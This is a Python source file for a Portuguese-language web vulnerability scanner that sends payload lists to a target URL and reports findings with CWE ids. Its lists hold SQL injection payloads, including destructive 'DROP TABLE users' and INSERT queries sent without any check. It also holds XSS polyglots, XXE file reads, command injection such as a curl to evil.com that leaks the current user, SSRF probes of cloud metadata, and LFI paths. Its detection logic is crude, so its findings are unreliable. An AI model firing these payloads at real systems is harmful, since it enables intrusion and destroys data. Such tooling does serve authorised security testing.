"""
Scanner de Vulnerabilidades COMPLETO - OLHOS DE DEUS
Baseado no scanner.ts original do projeto Pentester
Com TODOS os testes e payloads avançados
"""
import asyncio
import aiohttp
import urllib.parse
from typing import Optional, Dict, Any, List
from datetime import datetime
import logging
import json
import re

logger = logging.getLogger(__name__)


class AdvancedVulnerabilityScanner:
    """Scanner de vulnerabilidades completo com todos os testes"""
    
    def __init__(self, websocket_manager=None):
        self.websocket_manager = websocket_manager
        self.session: Optional[aiohttp.ClientSession] = None
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            connector=aiohttp.TCPConnector(ssl=False, limit=10)
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def make_request(self, url: str, method: str = "GET", headers: Dict = None, 
                          data: Any = None, allow_redirects: bool = False) -> Dict:
        """Faz requisição HTTP"""
        try:
            async with self.session.request(
                method=method,
                url=url,
                headers=headers or {},
                data=data,
                allow_redirects=allow_redirects
            ) as response:
                body = await response.text()
                return {
                    "status_code": response.status,
                    "headers": dict(response.headers),
                    "body": body[:10000]  # Limitar tamanho
                }
        except Exception as e:
            logger.error(f"Request error: {e}")
            return {"status_code": 0, "headers": {}, "body": ""}
    
    # ========== TESTES AVANÇADOS DE VULNERABILIDADES ==========
    
    async def test_advanced_sql_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        """SQL Injection avançado com múltiplos payloads"""
        payloads = [
            # Classic SQLi
            "'", "' OR '1'='1", "' OR 1=1--", "admin'--",
            # Union-based
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            # Boolean-based blind
            "' AND 1=1--", "' AND 1=2--", "' OR 'x'='x", "' OR 'x'='y",
            # Time-based blind
            "'; WAITFOR DELAY '00:00:05'--", "' OR SLEEP(5)--", "'; SELECT pg_sleep(5)--",
            # Stacked queries
            "'; DROP TABLE users--", "'; INSERT INTO users VALUES('hacked','hacked')--",
            # Error-based
            "' AND extractvalue(1,concat(0x7e,database()))--",
        ]
        
        for payload in payloads:
            test_url = f"{target}{'&' if '?' in target else '?'}id={urllib.parse.quote(payload)}"
            response = await self.make_request(test_url)
            body_lower = response["body"].lower()
            
            sql_errors = ['sql', 'mysql', 'syntax error', 'unexpected', 'database', 
                         'mariadb', 'postgresql', 'oracle', 'sqlite', 'odbc']
            
            if any(err in body_lower for err in sql_errors):
                return {
                    "scan_id": scan_id,
                    "severity": "critical",
                    "title": "SQL Injection Avançado",
                    "description": "Aplicação vulnerável a SQL injection incluindo union-based, boolean-based e time-based blind SQLi.",
                    "category": "Injection",
                    "endpoint": test_url,
                    "payload": payload,
                    "evidence": f"Erro SQL detectado. Status: {response['status_code']}. Body: {response['body'][:300]}",
                    "recommendation": "URGENTE: Use prepared statements/queries parametrizadas. Implemente WAF. Nunca concatene input de usuário em SQL.",
                    "cve": "CWE-89"
                }
        return None
    
    async def test_advanced_xss(self, target: str, scan_id: str) -> Optional[Dict]:
        """XSS avançado com bypass de filtros"""
        payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            # Filter bypass
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=x onerror=alert`XSS`>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            # Encoded payloads
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            # Polyglot XSS
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
            # DOM-based
            "#<img src=x onerror=alert(1)>",
            "javascript:alert(document.domain)",
            # Event handlers
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            # Attribute-based
            "\"onmouseover=\"alert('XSS')\"",
            "' autofocus onfocus=alert(1) x='",
            # Template injection
            "{{alert('XSS')}}",
            "${alert('XSS')}"
        ]
        
        for payload in payloads:
            test_url = f"{target}{'&' if '?' in target else '?'}q={urllib.parse.quote(payload)}"
            response = await self.make_request(test_url)
            
            if payload in response["body"] or urllib.parse.unquote(payload) in response["body"]:
                return {
                    "scan_id": scan_id,
                    "severity": "high",
                    "title": "XSS Avançado (Reflected/Stored)",
                    "description": "Aplicação reflete input sem sanitização. Vulnerável a XSS incluindo bypass de filtros e DOM-based.",
                    "category": "XSS",
                    "endpoint": test_url,
                    "payload": payload,
                    "evidence": f"Payload refletido sem sanitização. Status: {response['status_code']}",
                    "recommendation": "Implemente CSP headers, encoding HTML e validação de input. Use Trusted Types API.",
                    "cve": "CWE-79"
                }
        return None
    
    async def test_xxe(self, target: str, scan_id: str) -> Optional[Dict]:
        """XXE (XML External Entity) Attack"""
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><data>&xxe;</data>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>',
        ]
        
        for payload in xxe_payloads:
            response = await self.make_request(
                target,
                method='POST',
                headers={'Content-Type': 'application/xml'},
                data=payload
            )
            
            body_lower = response["body"].lower()
            if 'root:' in body_lower or '/bin/bash' in body_lower or 'entity' in body_lower:
                return {
                    "scan_id": scan_id,
                    "severity": "critical",
                    "title": "XXE (XML External Entity)",
                    "description": "Aplicação processa XML com entidades externas habilitadas, permitindo file disclosure e SSRF.",
                    "category": "Injection",
                    "endpoint": target,
                    "payload": payload[:100],
                    "evidence": f"XXE payload processado. Response: {body_lower[:200]}",
                    "recommendation": "Desabilite XML external entities. Use parsers XML seguros. Valide e sanitize XML input.",
                    "cve": "CWE-611"
                }
        return None
    
    async def test_command_injection(self, target: str, scan_id: str) -> Optional[Dict]:
        """Command Injection Detection"""
        cmd_payloads = [
            "; ls -la", "| whoami", "& cat /etc/passwd",
            "; ping -c 10 127.0.0.1", "`id`", "$(whoami)",
            "; curl http://evil.com/$(whoami)",
            "& timeout 10", "| sleep 10"
        ]
        
        for payload in cmd_payloads:
            test_url = f"{target}{'&' if '?' in target else '?'}cmd={urllib.parse.quote(payload)}"
            response = await self.make_request(test_url)
            body = response["body"].lower()
            
            indicators = ['uid=', 'gid=', 'root:', '/bin/bash', 'total ', 'drwx']
            if any(ind in body for ind in indicators):
                return {
                    "scan_id": scan_id,
                    "severity": "critical",
                    "title": "Command Injection",
                    "description": "Aplicação executa comandos do sistema baseado em input não sanitizado.",
                    "category": "Injection",
                    "endpoint": test_url,
                    "payload": payload,
                    "evidence": f"Comando executado. Output: {body[:300]}",
                    "recommendation": "CRÍTICO: Nunca execute comandos baseados em input de usuário. Use APIs seguras. Implemente whitelist rigorosa.",
                    "cve": "CWE-78"
                }
        return None
    
    async def test_ssrf(self, target: str, scan_id: str) -> Optional[Dict]:
        """Server-Side Request Forgery"""
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            "file:///etc/passwd",
            "http://[::1]",
            "http://0.0.0.0"
        ]
        
        for payload in ssrf_payloads:
            test_url = f"{target}{'&' if '?' in target else '?'}url={urllib.parse.quote(payload)}"
            response = await self.make_request(test_url)
            body = response["body"].lower()
            
            ssrf_indicators = ['root:', 'ami-id', 'instance-id', 'localhost', '127.0.0.1']
            if any(ind in body for ind in ssrf_indicators):
                return {
                    "scan_id": scan_id,
                    "severity": "high",
                    "title": "SSRF (Server-Side Request Forgery)",
                    "description": "Aplicação faz requisições para URLs arbitrárias, permitindo acesso a recursos internos.",
                    "category": "SSRF",
                    "endpoint": test_url,
                    "payload": payload,
                    "evidence": f"SSRF confirmado. Response: {body[:200]}",
                    "recommendation": "Implemente whitelist de URLs/IPs. Bloqueie acesso a ranges privados. Use DNS pinning.",
                    "cve": "CWE-918"
                }
        return None
    
    async def test_lfi(self, target: str, scan_id: str) -> Optional[Dict]:
        """Local File Inclusion"""
        lfi_payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index",
            "/proc/self/environ"
        ]
        
        for payload in lfi_payloads:
            test_url = f"{target}{'&' if '?' in target else '?'}file={urllib.parse.quote(payload)}"
            response = await self.make_request(test_url)
            body = response["body"].lower()
            
            if 'root:' in body or '/bin/bash' in body or 'nobody:' in body:
                return {
                    "scan_id": scan_id,
                    "severity": "critical",
                    "title": "LFI (Local File Inclusion)",
                    "description": "Aplicação permite leitura de arquivos arbitrários do servidor.",
                    "category": "File Inclusion",
                    "endpoint": test_url,
                    "payload": payload,
                    "evidence": f"Arquivo /etc/passwd lido. Content: {body[:300]}",
                    "recommendation": "URGENTE: Valide e sanitize file paths. Use whitelist. Implemente chroot jail.",
                    "cve": "CWE-22"
                }
        return None
    
    async def test_open_redirect(self, target: str, scan_id: str) -> Optional[Dict]:
        """Open Redirect Detection"""
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "https:evil.com",
            "//google.com"
        ]
        
        for payload in redirect_payloads:
            test_url = f"{target}{'&' if '?' in target else '?'}redirect={urllib.parse.quote(payload)}"
            response = await self.make_request(test_url, allow_redirects=False)
            
            location = response["headers"].get('location', response["headers"].get('Location', ''))
            if location and ('evil.com' in location or 'google.com' in location):
                return {
                    "scan_id": scan_id,
                    "severity": "medium",
                    "title": "Open Redirect",
                    "description": "Aplicação redireciona para URLs arbitrárias, podendo ser usada em phishing.",
                    "category": "Redirect",
                    "endpoint": test_url,
                    "payload": payload,
                    "evidence": f"Redirect para: {location}",
                    "recommendation": "Valide URLs de redirecionamento. Use whitelist de domínios permitidos.",
                    "cve": "CWE-601"
                }
        return None
    
    async def test_security_headers(self, target: str, scan_id: str) -> Optional[Dict]:
        """Verifica headers de segurança"""
        response = await self.make_request(target)
        headers_lower = {k.lower(): v for k, v in response["headers"].items()}
        
        missing = []
        weak = []
        
        # Headers críticos
        if 'x-frame-options' not in headers_lower:
            missing.append('X-Frame-Options')
        if 'x-content-type-options' not in headers_lower:
            missing.append('X-Content-Type-Options')
        if 'content-security-policy' not in headers_lower:
            missing.append('Content-Security-Policy')
        if 'strict-transport-security' not in headers_lower:
            missing.append('Strict-Transport-Security')
        if 'x-xss-protection' not in headers_lower:
            missing.append('X-XSS-Protection')
        
        # Verifica headers fracos
        if 'server' in headers_lower:
            weak.append(f"Server: {headers_lower['server']} (information disclosure)")
        if 'x-powered-by' in headers_lower:
            weak.append(f"X-Powered-By: {headers_lower['x-powered-by']} (information disclosure)")
        
        if missing or weak:
            severity = "high" if len(missing) >= 3 else "medium" if missing else "low"
            return {
                "scan_id": scan_id,
                "severity": severity,
                "title": "Headers de Segurança Faltando/Fracos",
                "description": f"Aplicação está faltando {len(missing)} headers de segurança importantes.",
                "category": "Headers",
                "endpoint": target,
                "payload": "GET " + target,
                "evidence": f"Missing: {', '.join(missing)}. Weak: {'; '.join(weak) if weak else 'None'}",
                "recommendation": f"Adicione headers: {', '.join(missing)}. Remova headers que revelam tecnologia.",
                "cve": "CWE-1021"
            }
        return None
    
    async def test_ssl_tls(self, target: str, scan_id: str) -> Optional[Dict]:
        """Verifica configuração SSL/TLS"""
        if not target.startswith('https://'):
            return {
                "scan_id": scan_id,
                "severity": "high",
                "title": "HTTPS/SSL Não Detectado",
                "description": "Aplicação não usa HTTPS, expondo dados a intercepção.",
                "category": "SSL/TLS",
                "endpoint": target,
                "payload": f"Protocol check: {target}",
                "evidence": f"URL usa HTTP inseguro: {target}",
                "recommendation": "Implemente HTTPS com certificado SSL válido. Force redirecionamento HTTP→HTTPS.",
                "cve": "CWE-319"
            }
        return None
    
    async def test_cors(self, target: str, scan_id: str) -> Optional[Dict]:
        """Verifica configuração CORS"""
        response = await self.make_request(
            target,
            headers={'Origin': 'https://evil.com'}
        )
        
        headers_lower = {k.lower(): v for k, v in response["headers"].items()}
        cors_header = headers_lower.get('access-control-allow-origin')
        cred_header = headers_lower.get('access-control-allow-credentials')
        
        if cors_header in ['*', 'https://evil.com', 'null'] or (cors_header and cred_header == 'true'):
            return {
                "scan_id": scan_id,
                "severity": "high",
                "title": "CORS Misconfiguration",
                "description": "CORS permite qualquer origin ou reflete origin maliciosa com credentials.",
                "category": "Configuration",
                "endpoint": target,
                "payload": "Origin: https://evil.com",
                "evidence": f"CORS: {cors_header}, Credentials: {cred_header}",
                "recommendation": "Configure whitelist específica de origins. Não use wildcard (*) com credentials.",
                "cve": "CWE-942"
            }
        return None
    
    async def test_directory_listing(self, target: str, scan_id: str) -> Optional[Dict]:
        """Directory Listing Detection"""
        common_paths = ['/uploads/', '/files/', '/backup/', '/admin/', '/test/', '/api/']
        
        for path in common_paths:
            test_url = target.rstrip('/') + path
            response = await self.make_request(test_url)
            body = response["body"].lower()
            
            if 'index of' in body or 'directory listing' in body or '<pre>' in body:
                return {
                    "scan_id": scan_id,
                    "severity": "medium",
                    "title": "Directory Listing Exposto",
                    "description": "Servidor permite listagem de diretórios, expondo estrutura de arquivos.",
                    "category": "Information Disclosure",
                    "endpoint": test_url,
                    "payload": path,
                    "evidence": f"Directory listing encontrado em {test_url}",
                    "recommendation": "Desabilite directory listing no servidor web. Configure Options -Indexes.",
                    "cve": "CWE-548"
                }
        return None
    
    async def scan_target(self, scan_id: str, target: str, scan_type: str, 
                         status_callback=None) -> List[Dict]:
        """Executa scan completo"""
        vulnerabilities = []
        
        # Lista completa de testes
        tests = [
            ("SQL Injection Avançado", self.test_advanced_sql_injection),
            ("XSS Avançado", self.test_advanced_xss),
            ("XXE Attack", self.test_xxe),
            ("Command Injection", self.test_command_injection),
            ("SSRF", self.test_ssrf),
            ("LFI (Local File Inclusion)", self.test_lfi),
            ("Open Redirect", self.test_open_redirect),
            ("Security Headers", self.test_security_headers),
            ("SSL/TLS", self.test_ssl_tls),
            ("CORS", self.test_cors),
            ("Directory Listing", self.test_directory_listing),
        ]
        
        async with self:
            total_tests = len(tests)
            for idx, (test_name, test_func) in enumerate(tests):
                try:
                    if status_callback:
                        await status_callback({
                            "progress": int((idx / total_tests) * 100),
                            "currentTask": f"Testando: {test_name}"
                        })
                    
                    result = await test_func(target, scan_id)
                    if result:
                        vulnerabilities.append(result)
                    
                    await asyncio.sleep(0.8)  # Rate limiting
                    
                except Exception as e:
                    logger.error(f"Test {test_name} failed: {e}")
                    continue
            
            if status_callback:
                await status_callback({
                    "progress": 100,
                    "currentTask": "Scan completado",
                    "status": "completed"
                })
        
        return vulnerabilities
